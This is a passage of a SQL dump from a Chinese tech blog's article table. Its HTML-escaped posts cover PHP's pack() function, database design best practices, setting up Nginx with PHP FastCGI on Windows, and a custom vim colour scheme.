(machine dependent size and representation)&lt;br /&gt;双精度实型格式(取决于机器的最大寻址位数和表示)&lt;/td&gt;&lt;/tr&gt;&lt;tr valign=&quot;center&quot;&gt;&lt;td align=&quot;left&quot;&gt;x&lt;/td&gt;&lt;td align=&quot;left&quot;&gt;NUL byte&lt;/td&gt;&lt;/tr&gt;&lt;tr valign=&quot;center&quot;&gt;&lt;td align=&quot;left&quot;&gt;X&lt;/td&gt;&lt;td align=&quot;left&quot;&gt;Back up one byte&lt;/td&gt;&lt;/tr&gt;&lt;tr valign=&quot;center&quot;&gt;&lt;td align=&quot;left&quot;&gt;@&lt;/td&gt;&lt;td align=&quot;left&quot;&gt;NUL-fill to absolute position &lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;下面以具体的例子来讲解一下每个参数的用法：&lt;/p&gt;&lt;p&gt;echo pack(&amp;quot;a&amp;quot;, 0x41); &amp;nbsp;//输出6&lt;/p&gt;&lt;p&gt;将一个十六进制数据0x41以十进制的方式读取，0x41转换成十进制是65，取一位返回就是6&lt;br /&gt;&lt;/p&gt;&lt;p&gt;echo pack(&amp;quot;a2&amp;quot;, 0x41); &amp;nbsp;//输出65&lt;/p&gt;&lt;p&gt;此代码为取两位返回为65&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;echo pack(&amp;quot;H2&amp;quot;, 0x41); &amp;nbsp;//输出e&lt;/p&gt;&lt;p&gt;将一个十六进制数据0x41以十进制的方式读取，由于H是每次格4位，这里用了H2，代表格8位，由于高位在前，0x41转换成十进制是65，65被H2格式化之后是0X65，转换成ASC码是e&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;echo pack(&amp;quot;c&amp;quot;, 0x41); &amp;nbsp;//输出A&lt;/p&gt;&lt;p&gt;0x41是十六进制的数据，所以经过c格式化之后是0x41，转换成ASC码是A&lt;/p&gt;&lt;p&gt;echo pack(&amp;quot;c&amp;quot;, 65); &amp;nbsp;//输出A&lt;/p&gt;&lt;p&gt;将十进制数据65以十六进制的方式读取，65转换成十六进制是0x41，然后经过c格式化，转换成ASC码是A&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;echo pack(&amp;quot;s&amp;quot;, 0x4143424445); &amp;nbsp; //输出ED&lt;br /&gt;&lt;/p&gt;&lt;p&gt;十六进制数据0x4143424445，经过s格式化，由于是按计算机字节的循序，所以从低位数据开始，格式化16位，返回0x45,0x44,转换成ASC码是ED&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#339999&quot;&gt;关于低位地址存放高位数据&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#339999&quot;&gt;数据：0x4143424445&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#339999&quot;&gt;位置：高位 &amp;nbsp; &amp;lt;-- &amp;nbsp; 低位&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#339999&quot;&gt;因为低端地址存放高端数据，41是最高端有效数据，所以存放在最低端地址，顺序为：&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#339999&quot;&gt;数据：41 &amp;nbsp; 43 &amp;nbsp; 42 &amp;nbsp; 44 &amp;nbsp; 45&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#339999&quot;&gt;位置：低端地址-&amp;gt;高端地址&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;echo pack(&amp;quot;n&amp;quot;, 0x4143424445); &amp;nbsp;//输出DE&lt;/p&gt;&lt;p&gt;将0x4143424445以十六进制方式读取，然后经过n格式化，由于是按照以低端地址存放高位数据顺序方式，格16位数据，返回0x44,0x45, 转换成ASC码是DE&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;echo pack(&amp;quot;v&amp;quot;, 0x4143424445); &amp;nbsp;//输出ED&lt;/p&gt;&lt;p&gt;将0x4143424445以十六进制方式读取，然后经过v格式化，由于是按照以低端地址存放低位数据顺序方式，格16位数据，返回0x45,0x44, 转换成ASC码是ED&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;echo pack(&amp;quot;i&amp;quot;, 0x4143424445); &amp;nbsp;//输出EDBC&lt;/p&gt;&lt;p&gt;将0x4143424445以十六进制方式读取，然后经过i格式化，由于xp系统的最大寻址位数是32位，所以格32位数据并以计算机字节顺序，返回0x45,0x44,0x42,0x43，转换成ASC码是EDBC&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;echo pack(&amp;quot;l&amp;quot;, 0x4143424445); &amp;nbsp;//输出EDBC&lt;/p&gt;&lt;p&gt;过程同s，这里是格式化32位数据字节，所以返回EDBC&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;echo pack(&amp;quot;N&amp;quot;, 0x4143424445); &amp;nbsp;//输出CBDE&lt;/p&gt;&lt;p&gt;过程同n，这里同样格式化32位数据字节，返回CBDE&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;对于pack，如果提供的数据不是format默认读取的数据进制，则会先转换为相应的数据进制，再进行打包操作&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;div class=&quot;methodsynopsis dc-description&quot;&gt;&lt;span class=&quot;methodname&quot;&gt;&lt;strong&gt;unpack&lt;/strong&gt;&lt;/span&gt; (&lt;span class=&quot;methodparam&quot;&gt;&lt;span class=&quot;type&quot;&gt;string&lt;/span&gt;&lt;tt class=&quot;parameter&quot;&gt;$format&lt;/tt&gt;&lt;/span&gt; , &lt;span class=&quot;methodparam&quot;&gt;&lt;span class=&quot;type&quot;&gt;string&lt;/span&gt;&lt;tt class=&quot;parameter&quot;&gt;$data&lt;/tt&gt;&lt;/span&gt; )&lt;/div&gt;将获取到的二进制数据流解包，format参数同pack()&lt;p&gt;&lt;br /&gt;&lt;/p&gt;', 1386429124),
(20, 20, '&lt;p&gt;&lt;img src=&quot;/uploads/Image/201312/07/1386429391_xty8yr_59_0_1328509079p5nx.gif&quot; title=&quot;0_1328509079p5nx.gif&quot; /&gt;&lt;/p&gt;&lt;ol class=&quot; list-paddingleft-2&quot;&gt;&lt;li&gt;&lt;p&gt;使用明确、统一的标明和列名，例如 School, SchoolCourse, CourceID。&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;数据表名使用单数而不是复数，例如 StudentCourse，而不是StudentCourses。 &lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;数据表名不要使用空格。 &lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;数据表名不要使用不必要的前缀或者后缀，例如使用School，而不是TblSchool，或者SchoolTable等等。 &lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;数据库中的密码要加密，到应用中再解密。 （其实就是散列存储、单向加密）&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;使用整数作为ID字段，也许现在没有这个必要，但是将来需要，例如关联表，索引等等。&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;使用整数字段做索引，否则会带来很大的性能问题 。&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;使用 bit 作为布尔字段，使用整数或者varcha是浪费。同时，这类字段应该以&ldquo;Is&rdquo;开头。 &lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;要经过认证才能访问数据库，不要给每一个用户管理员权限。 &lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;尽量避免使用&ldquo;select *&rdquo;，而使用&ldquo;select [required_column_list]&rdquo;以获得更好的性能。&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;假如程序代码比较复杂，使用ORM框架，例如hibernate，iBatis。ORM框架的性能问题可以通过详细的配置去解决。 &lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;分割不常使用的数据表到不同的物理存储以获得更好的性能。 &lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;对于关键数据库，使用安全备份系统，例如集群，同步等等。 &lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;使用外键，非空等限制来保证数据的完整性，不要把所有的东西都扔给程序。 &lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;缺乏数据库文档是致命的。你应该为你的数据库设计写文档，包括触发器、存储过程和其他脚本。 &lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;对于经常使用的查询和大型数据表，要使用索引。数据分析工具可以帮助你决定如何建立索引。 &lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;数据库服务器和网页服务器应该放在不同的机器上。这回提高安全性，并减轻CPU压力。 &lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;Image和blob字段不应该定义在常用的数据表中，否则会影响性能。 &lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;范式（Normalization）要按照要求使用以提高性能。Normalization做的不够会导致数据冗余，而过度Normalization 会导致太多的join和数据表，这两种情况都会影响性能。 &lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;多花点时间在数据库设计上，否则你将来会付出加倍的时间来偿还。 &lt;/p&gt;&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;参考：&lt;/p&gt;&lt;p&gt;&lt;a target=&quot;_blank&quot; href=&quot;http://www.oschina.net/question/28_37512&quot;&gt;http://www.oschina.net/question/28_37512&lt;/a&gt;&lt;/p&gt;&lt;a target=&quot;_blank&quot; href=&quot;http://www.javacodegeeks.com/2012/02/20-database-design-best-practices.html&quot;&gt;http://www.javacodegeeks.com/2012/02/20-database-design-best-practices.html&lt;/a&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;', 1386429425);
INSERT INTO `la_article` (`id`, `archiveid`, `content`, `updatetime`) VALUES
(21, 21, '&lt;p style=&quot;text-indent:2em;&quot;&gt;&lt;span style=&quot;font-size:16px&quot;&gt;&lt;strong&gt;Nginx简介：&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-indent:2em;&quot;&gt;Nginx (&amp;quot;engine x&amp;quot;) 是一个高性能的 HTTP 和 反向代理 服务器，也是一个 IMAP/POP3/SMTP &lt;a target=&quot;_blank&quot; href=&quot;http://baike.baidu.com/view/751.htm&quot;&gt;代理服务器&lt;/a&gt;。&lt;/p&gt;&lt;p style=&quot;text-indent:2em;&quot;&gt;&lt;br /&gt;&lt;/p&gt;&lt;p style=&quot;text-indent:2em;&quot;&gt;&lt;span style=&quot;font-size:16px&quot;&gt;&lt;strong&gt;Nginx优点：&lt;/strong&gt;&lt;/span&gt;&lt;br /&gt;&lt;/p&gt;&lt;p style=&quot;text-indent:2em;&quot;&gt;Nginx 可以在大多数 Unix like OS 上编译运行，并有 Windows 移植版。目前 Nginx 的1.0.9稳定版已经于2011年11月1日发布,开发版本已完成的为1.1.8，如果新建站点，建议使用最新稳定版作为生产版本，已有站点升级急迫性不高。 Nginx 的&lt;a target=&quot;_blank&quot; href=&quot;http://baike.baidu.com/view/60376.htm&quot;&gt;源代码&lt;/a&gt;使用 2-clause BSD-like license。&lt;/p&gt;&lt;p style=&quot;text-indent:2em;&quot;&gt;Nginx 是一个很牛的高性能Web和&lt;a target=&quot;_blank&quot; href=&quot;http://baike.baidu.com/view/1165595.htm&quot;&gt;反向代理&lt;/a&gt;服务器，它具有很多非常优越的特性：&lt;/p&gt;&lt;p style=&quot;text-indent:2em;&quot;&gt;在高连接并发的情况下，Nginx是Apache服务器不错的替代品，Nginx在&lt;a target=&quot;_blank&quot; href=&quot;http://baike.baidu.com/view/2398.htm&quot;&gt;美国&lt;/a&gt;是做虚拟主机生意的老板们经常选择的软件平台之一。能够支持高达 50,000 个并发连接数的响应，感谢Nginx为我们选择了 epoll and kqueue作为开发模型。&lt;/p&gt;&lt;p style=&quot;text-indent:2em;&quot;&gt;Nginx作为&lt;a target=&quot;_blank&quot; href=&quot;http://baike.baidu.com/view/253171.htm&quot;&gt;负载均衡服务器&lt;/a&gt;：Nginx 既可以在内部直接支持 Rails 和 PHP 程序对外进行服务，也可以支持作为 HTTP代理服务器对外进行服务。Nginx采用C进行编写，不论是&lt;a target=&quot;_blank&quot; href=&quot;http://baike.baidu.com/view/53557.htm&quot;&gt;系统资源&lt;/a&gt;开销还是CPU使用效率都比 Perlbal 要好很多。&lt;/p&gt;&lt;p style=&quot;text-indent:2em;&quot;&gt;作为邮件代理服务器：Nginx 同时也是一个非常优秀的邮件代理服务器（最早开发这个产品的目的之一也是作为邮件代理服务器），Last. fm 描述了成功并且美妙的使用经验。&lt;/p&gt;&lt;p style=&quot;text-indent:2em;&quot;&gt;Nginx 是一个安装非常的简单，配置文件非常简洁（还能够支持perl语法），Bugs非常少的服务器：Nginx 启动特别容易，并且几乎可以做到7*24不间断运行，即使运行数个月也不需要重新启动。你还能够不间断服务的情况下进行软件版本的升级。&lt;/p&gt;&lt;p style=&quot;text-indent:2em;&quot;&gt;&lt;span style=&quot;color:#339999&quot;&gt;nginx作为一款轻量级服务器，他支持PHP解释器以fastcgi方式运行php程序。&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-indent:2em;&quot;&gt;&lt;br /&gt;&lt;/p&gt;&lt;p style=&quot;text-indent:2em;&quot;&gt;&lt;strong&gt;&lt;span style=&quot;font-size:16px&quot;&gt;windows系统环境搭建：&lt;/span&gt;&lt;/strong&gt;&lt;br /&gt;&lt;/p&gt;&lt;p style=&quot;text-indent:2em;&quot;&gt;在windows上部署nginx服务器是非常简单的事情&lt;/p&gt;&lt;p style=&quot;text-indent:2em;&quot;&gt;第一步：下载nginx服务器，windows移植版的下载地址是：&lt;a target=&quot;_blank&quot; href=&quot;http://nginx.org/download/nginx-1.1.9.zip&quot;&gt;http://nginx.org/download/nginx-1.1.9.zip&lt;/a&gt;，然后解压zip文件并复制到c盘下，进入目录可以看到有nginx.exe文件，这是nginx的主程序文件，在dos中运行该文件可启动nginx服务器。&lt;br /&gt;&lt;/p&gt;&lt;p style=&quot;text-indent:2em;&quot;&gt;第二步：安装PHP，PHP的安装不做说明，个人是将php放在了c:/php目录下，下面会用到这个目录，注意nginx需要PHP解释器以fastcgi方式运行PHP程序，所以确保你的php安装包里有php-cgi.exe文件。&lt;/p&gt;&lt;p style=&quot;text-indent:2em;&quot;&gt;第三步：配置nginx，用editplus或者其他什么编辑器打开c:/nginx/conf/nginx.conf，将以下代码添加到http{...}中间&lt;/p&gt;&lt;pre class=&quot;brush:plain;toolbar:false;&quot;&gt;# php test server\r\nserver {\r\n    listen      81;\r\n    listen      localhost:81;\r\n    server_name localhost;\r\n                                                                                    \r\n    location ~ .php$ {\r\n        root c:/nginx/ntest;\r\n        fastcgi_pass   127.0.0.1:9000;\r\n        fastcgi_index  index.php;\r\n        fastcgi_param  SCRIPT_FILENAME  c:/nginx/ntest$fastcgi_script_name;\r\n        include        fastcgi_params;\r\n    }\r\n}&lt;/pre&gt;&lt;p style=&quot;text-indent:2em;&quot;&gt;新建server服务器监控端口，端口号是81，location的配置参照65-71行的配置代码，~ .php$ 是正则匹配，表示匹配以.php结尾的文件，root是你的php文件的主目录，然后需要配置fastcgi的端口地址9000，注意将/scripts修改为你的root的路径，否则会报404错误。&lt;/p&gt;&lt;p style=&quot;text-indent:2em;&quot;&gt;第四步：配置php.ini，修改以下配置参数&lt;/p&gt;&lt;pre class=&quot;brush:plain;toolbar:false;&quot;&gt;cgi.force_redirect = 1\r\ncgi.fix_pathinfo=1\r\ncgi.rfc2616_headers = 0&lt;/pre&gt;&lt;p style=&quot;text-indent:2em;&quot;&gt;第五步：启动PHP的cgi解释器，并且启动nginx服务器以处理php文件请求，具体步骤&lt;/p&gt;&lt;p style=&quot;text-indent:2em;&quot;&gt;首先cmd进入dos模式，切换到php目录下输入：php-cgi.exe -b 127.0.0.1:9000 -c c:/php/php.ini，开启php的cgi解释器&lt;/p&gt;&lt;p style=&quot;text-indent:2em;&quot;&gt;然后切换到nginx目录下，输入nginx.exe启动nginx服务器程序。&lt;br /&gt;&lt;/p&gt;&lt;p style=&quot;text-indent:2em;&quot;&gt;在你配置的root目录里，新建index.php文件&lt;/p&gt;&lt;pre class=&quot;brush:php;toolbar:false;&quot;&gt;&amp;lt;?php\r\necho phpinfo();&lt;/pre&gt;&lt;p style=&quot;text-indent:2em;&quot;&gt;最后在浏览器里访问&lt;/p&gt;&lt;p style=&quot;text-indent:2em;&quot;&gt;&lt;a href=&quot;http://localhost:81/index.php，&quot;&gt;http://localhost:81/index.php&lt;/a&gt;&lt;br /&gt;&lt;/p&gt;&lt;p style=&quot;text-indent:2em;&quot;&gt; 打印出php的配置信息可以看到_SERVER[&amp;quot;SERVER_SOFTWARE&amp;quot;]选项里PHP的web服务器是nginx&lt;br /&gt;&lt;/p&gt;&lt;p style=&quot;text-indent:2em;&quot;&gt; &lt;br /&gt;&lt;/p&gt;', 1386768378),
(22, 22, '&lt;p&gt;vim可以称得上是linux系统下的编辑神器，是一款高度可定制的编辑器，用它可以打造我们自己的完美的IDE。&lt;/p&gt;&lt;p&gt;在_vimrc配置文件中，我们可以设置colorscheme参数来载入我们自己的颜色插件，在vim目录下的colors文件夹里面你可以看到有一些预装的颜色插件&lt;/p&gt;&lt;p&gt;设置颜色插件命令：&lt;/p&gt;&lt;pre class=&quot;brush:plain;toolbar:false;&quot;&gt;if has(&quot;gui_running&quot;)\r\n  set guioptions-=T\r\n  set t_Co=256\r\n  colorscheme laphp\r\nendif&lt;/pre&gt;&lt;p&gt;修改colorscheme参数后面的值，可以载入不同的颜色配置&lt;/p&gt;&lt;p&gt;由于个人是做php开发的，试用了几个颜色配置后，觉的都不适合自己，所以自己根据phpx.vim配置了一个新插件, laphp.vim&lt;/p&gt;&lt;p&gt;具体配置如下：&lt;/p&gt;&lt;pre class=&quot;brush:plain;toolbar:false;&quot;&gt;&quot; Vim color file\r\n&quot; Maintainer: buzhidao\r\n&quot; Last Change:  2012 Feb 10\r\n&quot; as :color ladesert\r\nset background=light\r\n                           \r\nhi clear\r\n                           \r\nif exists(&quot;syntax_on&quot;)\r\n  syntax reset\r\nendif\r\n                           \r\nlet g:colors_name = &quot;laphp&quot;\r\n                           \r\nif exists(&quot;&amp;amp;t_Co&quot;) &amp;amp;&amp;amp; &amp;amp;t_Co &amp;gt; 2 &amp;amp;&amp;amp; &amp;amp;t_Co &amp;lt;= 8\r\n    &quot;Not much on the linux (text)console, unless anybody would document.\r\n    hi Normal          ctermfg=4 ctermbg=7\r\n    hi Comment         ctermfg=3\r\n    hi Constant        ctermfg=1\r\n    hi Special         ctermfg=3\r\n    hi Identifier      ctermfg=4\r\n    hi Statement       ctermfg=0\r\n    hi PreProc         ctermfg=2\r\n    hi Type            ctermfg=2\r\n    finish\r\nendif\r\n                           \r\n&quot; LIGHT COLOR DEFINE START\r\nhi Normal          guifg=#008000 guibg=#FFFFFF \r\nhi Cursor          guifg=#ffffff guibg=#333333\r\nhi Comment         guifg=#ff8000 guibg=bg\r\nhi Constant        guifg=#dd0000 guibg=bg\r\nhi Special         guifg=#0000bb guibg=bg\r\nhi Identifier      guifg=#0066cc guibg=bg\r\nhi Statement       guifg=#0000bb guibg=bg gui=NONE term=bold ctermfg=28 cterm=NONE \r\nhi Function        guifg=#008000 guibg=bg gui=bold\r\nhi Operator        guifg=#0066cc guibg=bg\r\nhi PreProc         guifg=#0000bb guibg=bg term=underline ctermfg=34\r\nhi Type            guifg=#0000bb guibg=bg term=underline ctermfg=34\r\nhi Underlined      guifg=#80a0ff guibg=bg term=underline cterm=underline ctermfg=9 gui=underline \r\nhi Ignore          guifg=bg guibg=fg cterm=bold ctermfg=0 \r\nhi Error           guifg=#ffffff guibg=#ff0000 term=reverse cterm=bold ctermfg=15 ctermbg=12 \r\nhi Todo            guifg=#0000ff guibg=#ffff00 term=standout ctermfg=0 ctermbg=14 \r\nhi Pmenu           guibg=#ff00ff guifg=fg ctermbg=13 \r\nhi PmenuSel        guibg=#a9a9a9 guifg=fg ctermbg=8 \r\nhi PmenuSbar       guibg=#bebebe guifg=fg ctermbg=7 \r\nhi PmenuThumb      guifg=fg guibg=bg gui=reverse cterm=reverse \r\nhi TabLine         guibg=#a9a9a9 guifg=fg gui=underline term=underline cterm=underline ctermfg=15 ctermbg=8 \r\nhi TabLineSel      guifg=fg guibg=bg gui=bold term=bold cterm=bold \r\nhi TabLineFill     guifg=fg guibg=bg gui=reverse term=reverse cterm=reverse \r\nhi MatchParen      guifg=#0000bb guibg=#c0ffc0 term=reverse ctermfg=3 ctermbg=229 \r\nhi SpecialKey      guifg=#00ffff guibg=bg term=bold ctermfg=9 \r\nhi NonText         guifg=#0000ff guibg=bg gui=bold term=bold ctermfg=9 \r\nhi Directory       guifg=#d700af guibg=bg term=bold ctermfg=11 \r\nhi ErrorMsg        guifg=#ffffff guibg=#ff0000 term=standout cterm=bold ctermfg=15 ctermbg=4 \r\nhi IncSearch       guifg=#708090 guibg=#f0e68c gui=reverse term=reverse cterm=reverse ctermfg=11 ctermbg=10 \r\nhi Search          guifg=#000087 guibg=#ff8000 term=reverse ctermfg=18 ctermbg=122 \r\nhi MoreMsg         guifg=#00875f guibg=bg term=bold ctermfg=29 gui=bold \r\nhi ModeMsg         guifg=#d7af00 guibg=bg term=bold cterm=bold ctermfg=178 gui=bold \r\nhi LineNr          guifg=#000000 guibg=bg term=underline ctermfg=186 \r\nhi Question        guifg=#00ffff guibg=bg gui=bold term=standout ctermfg=14 \r\nhi StatusLine      guifg=#333333 guibg=bg gui=bold,reverse term=bold,reverse cterm=bold,reverse ctermfg=18 ctermbg=15 \r\nhi StatusLineNC    guifg=#333333 guibg=bg gui=bold,reverse term=bold,reverse cterm=bold,reverse ctermfg=246 ctermbg=15 \r\nhi VertSplit       guifg=#333333 guibg=bg gui=reverse ctermfg=18 ctermbg=251 term=reverse cterm=reverse \r\nhi Title           guifg=#d700af guibg=bg gui=bold term=bold ctermfg=163 \r\nhi Visual          guifg=#316ac5 guibg=#ffffff gui=reverse term=reverse cterm=reverse ctermfg=229 ctermbg=22 \r\nhi VisualNOS       guifg=fg guibg=bg gui=bold,underline term=bold,underline cterm=bold,underline \r\nhi WarningMsg      guifg=#ff0000 guibg=bg term=standout ctermfg=9 \r\nhi WildMenu        guifg=#000000 guibg=#ffff00 guifg=fg term=standout ctermfg=0 ctermbg=11 \r\nhi Folded          guifg=#00ffff guibg=#a8a8a8 term=standout ctermfg=14 ctermbg=248 \r\nhi FoldColumn      guifg=#ffffff guibg=#333333 term=standout ctermfg=14 ctermbg=250 \r\nhi DiffAdd         guibg=#000087 guifg=#e4e4e4 term=bold ctermbg=1 ctermbg=18 ctermfg=254 \r\nhi DiffChange      guibg=#870087 guifg=#87afff term=bold ctermbg=90 \r\nhi DiffDelete      guifg=#0000ff guibg=#008787 gui=bold term=bold cterm=bold ctermfg=21 ctermbg=30 ctermbg=3 \r\nhi DiffText        guibg=#ff0000 guifg=fg gui=bold term=reverse cterm=bold ctermbg=9 \r\nhi SignColumn      guifg=#00ffff guibg=#bcbcbc term=standout ctermfg=14 ctermbg=250 \r\nhi lCursor         guifg=#d7ffd7 guibg=#0000af\r\n&quot; LIGHT COLOR DEFINE END\r\n                           \r\n&quot;finish\r\n                           \r\n&quot; DARK COLOR DEFINE START\r\nhi Normal          guifg=#909090 guibg=#131313 ctermfg=19 ctermbg=254 \r\nhi Cursor          guifg=#131313 guibg=#909090 \r\nhi Comment         guifg=#e4e4e4 guibg=bg ctermfg=208 \r\nhi Constant        guifg=#dd0000 guibg=bg ctermfg=160 \r\nhi Special         guifg=#00af00 guibg=bg term=bold ctermfg=166 \r\nhi Identifier      guifg=#0066cc guibg=bg term=underline cterm=NONE ctermfg=19 \r\nhi Statement       guifg=#00af00 guibg=bg gui=NONE term=bold ctermfg=28 cterm=NONE \r\nhi Function        guifg=#ff8000 guibg=bg gui=bold\r\nhi Operator        guifg=#0066cc guibg=bg\r\nhi PreProc         guifg=#00af00 guibg=bg term=underline cterm=bold ctermfg=34 gui=bold \r\nhi Type            guifg=#00af00 guibg=bg term=underline ctermfg=34 \r\nhi Underlined      guifg=#80a0ff guibg=bg term=underline cterm=underline ctermfg=9 gui=underline \r\nhi Ignore          guifg=bg guibg=fg cterm=bold ctermfg=0 \r\nhi Error           guifg=#ffffff guibg=#ff0000 term=reverse cterm=bold ctermfg=15 ctermbg=12 \r\nhi Todo            guifg=#0000ff guibg=#ffff00 term=standout ctermfg=0 ctermbg=14 \r\nhi Pmenu           guibg=#ff00ff guifg=fg ctermbg=13 \r\nhi PmenuSel        guibg=#a9a9a9 guifg=fg ctermbg=8 \r\nhi PmenuSbar       guibg=#bebebe guifg=fg ctermbg=7 \r\nhi PmenuThumb      guifg=fg guibg=bg gui=reverse cterm=reverse \r\nhi TabLine         guibg=#a9a9a9 guifg=fg gui=underline term=underline cterm=underline ctermfg=15 ctermbg=8 \r\nhi TabLineSel      guifg=fg guibg=bg gui=bold term=bold cterm=bold \r\nhi TabLineFill     guifg=fg guibg=bg gui=reverse term=reverse cterm=reverse \r\nhi MatchParen      guifg=#00af00 guibg=#333333 term=reverse ctermfg=3 ctermbg=229 \r\nhi SpecialKey      guifg=#00ffff guibg=bg term=bold ctermfg=9 \r\nhi NonText         guifg=#0000ff guibg=bg gui=bold term=bold ctermfg=9 \r\nhi Directory       guifg=#d700af guibg=bg term=bold ctermfg=11 \r\nhi ErrorMsg        guifg=#ffffff guibg=#ff0000 term=standout cterm=bold ctermfg=15 ctermbg=4 \r\nhi IncSearch       guifg=#708090 guibg=#f0e68c gui=reverse term=reverse cterm=reverse ctermfg=11 ctermbg=10 \r\nhi Search          guifg=#000087 guibg=#ff8000 term=reverse ctermfg=18 ctermbg=122 \r\nhi MoreMsg         guifg=#00875f guibg=bg term=bold ctermfg=29 gui=bold \r\nhi ModeMsg         guifg=#d7af00 guibg=bg term=bold cterm=bold ctermfg=178 gui=bold \r\nhi LineNr          guifg=#909090 guibg=bg term=underline ctermfg=186 \r\nhi Question        guifg=#00ffff guibg=bg gui=bold term=standout ctermfg=14 \r\nhi StatusLine      guifg=#333333 guibg=#909090 gui=bold,reverse term=bold,reverse cterm=bold,reverse ctermfg=18 ctermbg=15 \r\nhi StatusLineNC    guifg=#333333 guibg=#909090 gui=bold,reverse term=bold,reverse cterm=bold,reverse ctermfg=246 ctermbg=15 \r\nhi VertSplit       guifg=#333333 guibg=#909090 gui=reverse ctermfg=18 ctermbg=251 term=reverse cterm=reverse \r\nhi Title           guifg=#d700af guibg=bg gui=bold term=bold ctermfg=163 \r\nhi Visual          guifg=#cccccc guibg=#000000 gui=reverse term=reverse cterm=reverse ctermfg=229 ctermbg=22 \r\nhi VisualNOS       guifg=fg guibg=bg gui=bold,underline term=bold,underline cterm=bold,underline \r\nhi WarningMsg      guifg=#ff0000 guibg=bg term=standout ctermfg=9 \r\nhi WildMenu        guifg=#000000 guibg=#ffff00 guifg=fg term=standout ctermfg=0 ctermbg=11 \r\nhi Folded          guifg=#00ffff guibg=#a8a8a8 term=standout ctermfg=14 ctermbg=248 \r\nhi FoldColumn      guifg=#ffffff guibg=#333333 term=standout ctermfg=14 ctermbg=250 \r\nhi DiffAdd         guibg=#000087 guifg=#e4e4e4 term=bold ctermbg=1 ctermbg=18 ctermfg=254 \r\nhi DiffChange      guibg=#870087 guifg=#87afff term=bold ctermbg=90 \r\nhi DiffDelete      guifg=#0000ff guibg=#008787 gui=bold term=bold cterm=bold ctermfg=21 ctermbg=30 ctermbg=3 \r\nhi DiffText        guibg=#ff0000 guifg=fg gui=bold term=reverse cterm=bold ctermbg=9 \r\nhi SignColumn      guifg=#00ffff guibg=#bcbcbc term=standout ctermfg=14 ctermbg=250 \r\nhi lCursor         guifg=#d7ffd7 guibg=#0000af\r\n&quot; DARK COLOR DEFINE END\r\n                           \r\nfinish&lt;/pre&gt;&lt;p&gt;这个配置包含两种颜色搭配，一种是白色的背景色，一种是黑色的背景色，默认配置是用黑色的背景色，如果想用白色的背景色，将light color与dark color代码块中间的finish前面的&amp;quot;去掉即可&lt;/p&gt;&lt;p&gt;楼主很好心的放上了效果图&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size:18px;color:#006600&quot;&gt;黑色背景：&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/uploads/Image/201312/11/1386768624_n13uor_2305_0_13288933165HII.gif.jpg&quot; title=&quot;0_13288933165HII.gif.jpg&quot; /&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size:18px;color:#006600&quot;&gt;白色背景：&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/uploads/Image/201312/11/1386768689_clylpv_8336_0_1328893359LFl0.gif.jpg&quot; title=&quot;0_1328893359LFl0.gif.jpg&quot; /&gt;&lt;/p&gt;', 1386768701);
INSERT INTO `la_article` (`id`, `archiveid`, `content`, `updatetime`) VALUES
